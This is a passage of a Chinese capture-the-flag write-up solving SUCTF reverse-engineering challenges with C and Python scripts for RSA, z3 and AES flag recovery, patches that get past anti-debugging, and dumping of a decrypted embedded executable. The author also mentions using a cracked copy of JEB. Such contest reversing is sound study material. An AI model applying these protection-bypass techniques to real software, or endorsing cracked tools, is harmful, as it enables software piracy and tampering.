class="hljs-number">0x2A</span>, <span class="hljs-number">0x0BE</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x0C3</span>, <span class="hljs-number">0x0AA</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x0F4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x0EF</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0ED</span>, <span class="hljs-number">0x0CF</span>, <span class="hljs-number">0x0AC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E4</span>, <span class="hljs-number">0x0B3</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x0A9</span>, <span class="hljs-number">0x0C9</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x0E8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x0DF</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x0FA</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0A6</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x0A7</span>, <span class="hljs-number">0x0FC</span>, <span class="hljs-number">0x0F3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x0BA</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x0E6</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x0A8</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x0B2</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x0DA</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0F8</span>, <span class="hljs-number">0x0EB</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0D1</span>, <span class="hljs-number">0x0A2</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x0D4</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x0D3</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x0E7</span>, <span class="hljs-number">0x0A0</span>, <span class="hljs-number">0x0C4</span>, <span class="hljs-number">0x0C8</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x0EA</span>, <span class="hljs-number">0x0BF</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x0D2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x0C7</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x0B5</span>, <span class="hljs-number">0x0A3</span>, <span class="hljs-number">0x0F7</span>, <span class="hljs-number">0x0F2</span>, <span class="hljs-number">0x0CE</span>, <span class="hljs-number">0x0F9</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x0A1</span>, <span class="hljs-number">0x0E0</span>, <span class="hljs-number">0x0AE</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x0A4</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x0AD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0F5</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0B1</span>, <span class="hljs-number">0x0E3</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x0F6</span>, <span class="hljs-number">0x0E2</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x0CA</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x0C0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x0AB</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x0D5</span>, <span class="hljs-number">0x0DB</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x0DE</span>, <span class="hljs-number">0x0FD</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x0FF</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x0AF</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x0BB</span>, <span class="hljs-number">0x0DD</span>, <span class="hljs-number">0x0BC</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x0D9</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x0D8</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0C1</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x0A5</span>, <span class="hljs-number">0x0CD</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x0BD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0D0</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x0B8</span>, <span class="hljs-number">0x0E5</span>, <span class="hljs-number">0x0B4</span>, <span class="hljs-number">0x0B0</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x0B9</span>, <span class="hljs-number">0x0F1</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0x0C5</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x0C6</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x0F0</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x0EC</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0DC</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x0EE</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x0D7</span>, <span class="hljs-number">0x0CB</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x0C6</span>, <span class="hljs-number">0x0BA</span>, <span class="hljs-number">0x0B1</span>, <span class="hljs-number">0x0A3</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x0AA</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x0DC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x0B2</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>&#125;<span class="hljs-comment">;</span><br><br>__int64 __fastcall sub_564F32EDB464(unsigned <span class="hljs-keyword">int</span> a1)<br>&#123;<br>    unsigned <span class="hljs-keyword">int</span> v1<span class="hljs-comment">;</span><br>  v1 = (v3[(BYTE2(a1))&amp;<span class="hljs-number">0xff</span>] &lt;&lt; <span class="hljs-number">16</span>) | v3[a1&amp;<span class="hljs-number">0xff</span>] | (v3[(BYTE1(a1))&amp;<span class="hljs-number">0xff</span>] &lt;&lt; <span class="hljs-number">8</span>) | (v3[(a1 &gt;&gt; <span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span>] &lt;&lt; <span class="hljs-number">24</span>)<span class="hljs-comment">;</span><br>  return <span class="hljs-keyword">ROL</span>(v1,<span class="hljs-number">12</span>)^<span class="hljs-keyword">ROL</span>(v1,<span class="hljs-number">8</span>)^<span class="hljs-keyword">ROR</span>(v1,<span class="hljs-number">2</span>)^<span class="hljs-keyword">ROR</span>(v1,<span class="hljs-number">6</span>)<span class="hljs-comment">;</span><br>&#125;<br>__int64 __fastcall sub_564F32EDB43B(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3, unsigned <span class="hljs-keyword">int</span> a4)<br>&#123;<br>    return a1 ^ (unsigned <span class="hljs-keyword">int</span>)sub_564F32EDB464(a2 ^ a3 ^ a4)<span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-keyword">int</span> main()<br>&#123;<br>    unsigned <span class="hljs-keyword">int</span> tmp[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;<span class="hljs-comment">;</span><br>    unsigned <span class="hljs-keyword">int</span> cipher[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0xBE040680</span>, <span class="hljs-number">0xC5AF7647</span>, <span class="hljs-number">0x9FCC401F</span>, <span class="hljs-number">0xD8BF92EF</span>&#125;<span class="hljs-comment">;</span><br>    memcpy(tmp+<span class="hljs-number">26</span>,cipher,<span class="hljs-number">16</span>)<span class="hljs-comment">;</span><br>    <span class="hljs-keyword">int</span> i<span class="hljs-comment">;</span><br>    for(i=<span class="hljs-number">25</span><span class="hljs-comment">;i&gt;=0;i--)</span><br>    &#123;<br>        tmp[i] = sub_564F32EDB43B(tmp[i+<span class="hljs-number">4</span>],tmp[i+<span class="hljs-number">1</span>],tmp[i+<span class="hljs-number">2</span>],tmp[i+<span class="hljs-number">3</span>])<span class="hljs-comment">;</span><br>    &#125;<br>    printf(<span class="hljs-string">&quot;%s&quot;</span>,tmp)<span class="hljs-comment">;</span><br>    return <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是v1为unsigned int<br>如果写int答案就错。。。莫名其妙<br>玄学问题<br>大部分还是靠着复制的伪代码<br>ida.h的头文件自己加上就好了<br>这算法真简单。。。<br>自家还是太懒了不肯耐心看下去。。。</p><h1 id="SUCTF"><a href="#SUCTF" class="headerlink" title="SUCTF"></a>SUCTF</h1><p>这次suctf ak了re 俩个三血，还是挺满足的，同时也学到了许多新东西</p><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>猜。。。<br>这题真是猜的。。。<br>看到65537可以联想到rsa，还有那个gmp库</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-attribute">import</span> gmpy<span class="hljs-number">2</span><br><br><span class="hljs-attribute">p1</span> = <span class="hljs-number">282164587459512124844245113950593348271</span>                    #模数<br><span class="hljs-attribute">p2</span> = <span class="hljs-number">366669102002966856876605669837014229419</span><br><span class="hljs-attribute">n</span> = <span class="hljs-number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span>      #n<br><span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span>                                                        #e<br><span class="hljs-attribute">phi_n</span> = (p<span class="hljs-number">1</span> - <span class="hljs-number">1</span>) * (p<span class="hljs-number">2</span> - <span class="hljs-number">1</span>)<br><span class="hljs-attribute">d</span> = gmpy<span class="hljs-number">2</span>.invert(e, phi_n)<br><br><span class="hljs-attribute">print</span> hex(d)<br><br><span class="hljs-attribute">c</span> = <span class="hljs-number">0</span>xad<span class="hljs-number">939</span>ff<span class="hljs-number">59</span>f<span class="hljs-number">6</span>e<span class="hljs-number">70</span>bcbfad<span class="hljs-number">406</span>f<span class="hljs-number">2494993757</span>eee<span class="hljs-number">98</span>b<span class="hljs-number">91</span>bc<span class="hljs-number">244184</span>a<span class="hljs-number">377520</span>d<span class="hljs-number">06</span>fc<span class="hljs-number">35</span>        #密文<br><span class="hljs-attribute">m</span> = pow(c, d, n)<br><span class="hljs-attribute">print</span> hex(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&quot;hex&quot;</span>)#hex(m)[<span class="hljs-number">2</span>:len(hex(m))-<span class="hljs-number">1</span>].decode(&#x27;hex&#x27;)<br></code></pre></td></tr></table></figure><p>suctf{Pwn_@_hundred_years}<br>人人人，求你pwn我一百年！！！</p><h2 id="hardCPP"><a href="#hardCPP" class="headerlink" title="hardCPP"></a>hardCPP</h2><p>刚看到懵逼了以为是ollvm<br>还好不难，下断点直接写<br><img src="21.png" alt="21"><br>可以发现前面有time反调试，很明显俩边相减要是0，后面还用相减结果与输入xor<br>更说明了这一点<br>可以直接把sub esi, [rbp-28]改成xor esi, esi<br>然后是判断长度是否满足<br>最终判断逻辑就是(a[i+1] + (a[i]%7))^((a[i]^18)*3+2)<br><img src="22.png" alt="22"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-built_in">from</span> z3 import *<br>b = [<span class="hljs-number">0xF3</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x8C</span>,<br>  <span class="hljs-number">0x40</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xA5</span>]<br>s = Solver()<br><span class="hljs-keyword">a</span> = [BitVec(<span class="hljs-string">&#x27;u%d&#x27;</span>%i,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">21</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">a</span>)):<br>    s.<span class="hljs-built_in">add</span>(<span class="hljs-keyword">a</span>[i]&gt;=<span class="hljs-number">32</span>)<br>    s.<span class="hljs-built_in">add</span>(<span class="hljs-keyword">a</span>[i]&lt;=<span class="hljs-number">125</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(b)):<br>    s.<span class="hljs-built_in">add</span>(b[i] == (<span class="hljs-keyword">a</span>[i+<span class="hljs-number">1</span>] + (<span class="hljs-keyword">a</span>[i]%<span class="hljs-number">7</span>))^((<span class="hljs-keyword">a</span>[i]^<span class="hljs-number">18</span>)*<span class="hljs-number">3</span>+<span class="hljs-number">2</span>))<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>print s.check()<br><span class="hljs-keyword">if</span> s.check() == sat:<br>    <span class="hljs-built_in">result</span> = s.model()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">21</span>):<br>        flag += chr(<span class="hljs-built_in">result</span>[<span class="hljs-keyword">a</span>[i]].as_long().real)<br>    print flag<br></code></pre></td></tr></table></figure><p>解出来#flag{mY-CurR1ed_Fns}</p><h2 id="Akira-Homework"><a href="#Akira-Homework" class="headerlink" title="Akira Homework"></a>Akira Homework</h2><p>这题非常规。。。<br>等别人一波wp<br>当时拿了三血<br>很明显程序有很强的反调试，isdebugpresent就不说了<br>关键是会检测ida窗口<br>只要ida打开，程序闪退<br>只能强行调试<br><img src="23.png" alt="23"><br>可以看到puts,这边的字符串都是加密过的运行时解密输出<br>主要问题时下面scanf不能跑直接飞<br>这边选择直接跳过//反调试太猛了怼不动<br>直接进行下面语句，在内存中修改//变相scanf<br>然后发现输入前18应该为Akira_aut0_ch3ss_!<br>然后下面有判断<br>sub_7FF7198E6C10里有个解密<br>应该是虚函数<br><img src="24.png" alt="24"><br>里面有个贼大的表，在用输入解密他<br><img src="25.png" alt="25"><br>后来发现这应该是个pe文件调到后面有判断，这边的解密我强行调试只call一次<br>应该call三次，看表的交叉引用可以看到<br>然后利用pe文件的性质，末尾应该全是0<br>每隔三个解密pe文件，很明显看到明文输入<br><img src="26.png" alt="26"><br>每隔三个看，可以看到Akira_aut0_ch3ss_!<br>也可以看到第二次解密传进去的参数应该是啥<br>这边我强行call三次解密<br>程序解密完后把exe提取出来<br>//没办法，反调试太鸡儿猛<br>放ida静态看exe<br><img src="27.png" alt="27"><br>就是一个输入比较<br>其实只要调起来这题肯定很快出<br>可以发现是aes key应该是Ak1i3aS3cre7K3y<br>哪能咋办，慢慢猜呗。。。<br>cbc iv是0<br>最后猜出来</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#coding=UTF-8</span><br><span class="hljs-built_in">from</span> Crypto.Cipher import AES<br><span class="hljs-built_in">from</span> binascii import b2a_hex, a2b_hex<br><span class="hljs-comment"># 如果text不足16位的倍数就用空格补足为16位</span><br>def add_to_16(<span class="hljs-keyword">text</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-keyword">text</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) % <span class="hljs-number">16</span>:<br>        <span class="hljs-built_in">add</span> = <span class="hljs-number">16</span> - (<span class="hljs-built_in">len</span>(<span class="hljs-keyword">text</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) % <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">add</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">text</span> = <span class="hljs-keyword">text</span> + (<span class="hljs-string">&#x27;/0&#x27;</span> * <span class="hljs-built_in">add</span>)<br>    <span class="hljs-literal">return</span> <span class="hljs-keyword">text</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><br><span class="hljs-comment"># 加密函数</span><br>def <span class="hljs-built_in">encrypt</span>(<span class="hljs-keyword">text</span>):<br>    key = <span class="hljs-string">&#x27;9999999999999999&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    mode = AES.MODE_CBC<br>    iv = b<span class="hljs-string">&#x27;qqqqqqqqqqqqqqqq&#x27;</span><br>    <span class="hljs-keyword">text</span> = add_to_16(<span class="hljs-keyword">text</span>)<br>    cryptos = AES.<span class="hljs-built_in">new</span>(key, mode, iv)<br>    cipher_text = cryptos.<span class="hljs-built_in">encrypt</span>(<span class="hljs-keyword">text</span>)<br>    <span class="hljs-comment"># 因为AES加密后的字符串不一定是ascii字符集的，输出保存可能存在问题，所以这里转为16进制字符串</span><br>    <span class="hljs-literal">return</span> b2a_hex(cipher_text)<br><br><br><span class="hljs-comment"># 解密后，去掉补足的空格用strip() 去掉</span><br>def <span class="hljs-built_in">decrypt</span>(<span class="hljs-keyword">text</span>):<br>    key = <span class="hljs-string">&#x27;Ak1i3aS3cre7K3y\x00&#x27;</span><br>    iv = b<span class="hljs-string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br>    mode = AES.MODE_CBC<br>    cryptos = AES.<span class="hljs-built_in">new</span>(key, mode, iv)<br>    plain_text = cryptos.<span class="hljs-built_in">decrypt</span>(a2b_hex(<span class="hljs-keyword">text</span>))<br>    <span class="hljs-literal">return</span> <span class="hljs-keyword">bytes</span>.decode(plain_text).rstrip(<span class="hljs-string">&#x27;/0&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>dd=<span class="hljs-string">&quot;94BF7A0CA43550D1C215ECEF9D9AAA56&quot;</span><br>print <span class="hljs-built_in">decrypt</span>(dd)<br></code></pre></td></tr></table></figure><p>flag{Ak1rAWin!}<br>居然是三血。。。</p><h2 id="babyunic"><a href="#babyunic" class="headerlink" title="babyunic"></a>babyunic</h2><p>凌晨上题<br>还好有破解版的jeb<br>直接func拖进去mips 大端序<br>就能看到一开始有位运算和xor<br>然后是超大方程组<br>就是个行矩阵和一个42*42的矩阵相乘最后与行矩阵比较<br>注意最后的比较，读数据的时候应该是大端序读。。。<br><img src="28.png" alt="28"><br>一开始以为是ida默认的小端，然后感觉不对劲怎么会这么大。。。<br>本想高斯消元解方程出答案//太多了<br>直接甩给密码队友1min出数组<br>跑一下出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a[] = &#123;<span class="hljs-number">154</span>, <span class="hljs-number">171</span>, <span class="hljs-number">24</span>, <span class="hljs-number">161</span>, <span class="hljs-number">54</span>, <span class="hljs-number">222</span>, <span class="hljs-number">172</span>, <span class="hljs-number">116</span>, <span class="hljs-number">129</span>, <span class="hljs-number">18</span>, <span class="hljs-number">139</span>, <span class="hljs-number">152</span>, <span class="hljs-number">127</span>, <span class="hljs-number">247</span>, <span class="hljs-number">36</span>, <span class="hljs-number">124</span>, <span class="hljs-number">43</span>, <span class="hljs-number">90</span>, <span class="hljs-number">97</span>, <span class="hljs-number">138</span>, <span class="hljs-number">238</span>, <span class="hljs-number">95</span>, <span class="hljs-number">141</span>, <span class="hljs-number">237</span>, <span class="hljs-number">26</span>, <span class="hljs-number">227</span>, <span class="hljs-number">152</span>, <span class="hljs-number">154</span>, <span class="hljs-number">167</span>, <span class="hljs-number">54</span>, <span class="hljs-number">141</span>, <span class="hljs-number">166</span>, <span class="hljs-number">139</span>, <span class="hljs-number">66</span>, <span class="hljs-number">216</span>, <span class="hljs-number">129</span>, <span class="hljs-number">94</span>, <span class="hljs-number">164</span>, <span class="hljs-number">69</span>, <span class="hljs-number">188</span>, <span class="hljs-number">33</span>, <span class="hljs-number">194</span>&#125;;<br>  <span class="hljs-keyword">int</span> i,j=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">42</span>;i++)<br>  &#123;<br>      a[i]^=i;<br>      a[i] = ((a[i]&amp;<span class="hljs-number">7</span>)&lt;&lt;<span class="hljs-number">5</span>)|(a[i]&gt;&gt;<span class="hljs-number">3</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i]);<br>  &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>SUCTF{Un1c0rn_Engin3_Is_@_P0wer7ul_TO0ls!}</p><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><p>居然放在最后一题。。。未免tcl<br>不知道为什么写出来的人那么少<br>//没时间py了把<br>和de1ctf的有点太像了吧数据，截断。<br><img src="29.png" alt="29"><br>这边俩个check第一个是检查输入是不是按照数据 符号 数据 符号 数据 这样的<br>下面一个就是第一段数据长度为10<br>isspace ispunct<br>这种函数基本可以猜出是在干啥了<br>代码量是多了点，但配合猜写的还是很快的<br>现在知道了输入条件下面看check<br><img src="30.png" alt="30"><br>这边是第一个check<br>逻辑第一眼看上去有点矛盾又是要长度为10又是要为5<br>其实前面输入的为1就不算在这边的check长度里<br>所以前面十个输入是11111suctf<br>再看看第二个check<br>其实更简单。。。字母隔2一个输入<br>输入四个从A开始<br>所以输入应该是ACEG<br>第三个输入check就是个z3<br>输入转为一个整数然后判断</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-attribute">from</span> z<span class="hljs-number">3</span> import *<br><span class="hljs-attribute">s</span> = Solver()<br><span class="hljs-attribute">x</span> = BitVec(&#x27;x&#x27;,<span class="hljs-number">32</span>)<br><span class="hljs-attribute">s</span>.add((<span class="hljs-number">1234</span> * x + <span class="hljs-number">5678</span>) / <span class="hljs-number">4396</span> ^ <span class="hljs-number">2882395322</span> == <span class="hljs-number">2882386105</span>)<br><span class="hljs-attribute">s</span>.add((<span class="hljs-number">2334</span> * x + <span class="hljs-number">9875</span>) / <span class="hljs-number">7777</span> ^ <span class="hljs-number">305358736</span> == <span class="hljs-number">305396848</span>)<br><span class="hljs-attribute">print</span> s.check()<br><span class="hljs-attribute">print</span> s.model()<br></code></pre></td></tr></table></figure><p>[x = 31415926]<br>所以第三段数据是31415926<br>11111suctf_ACEG_31415926<br>输入得flag<br>suctf{ACEG31415926}<br>re结束</p><h1 id="suctf学习总结"><a href="#suctf学习总结" class="headerlink" title="suctf学习总结"></a>suctf学习总结</h1><p>每次打完比赛来一波总结<br>这次主要学到的新知识还挺多的<br>首先是骑驴出的俩题，一道是rsa还有一道Unicorn Engine得<br>rsa在re中的出现很少，Unicorn Engine应该是有史以来第一次把。。。<br>//听说今年nu1l的ctf也出了Unicorn 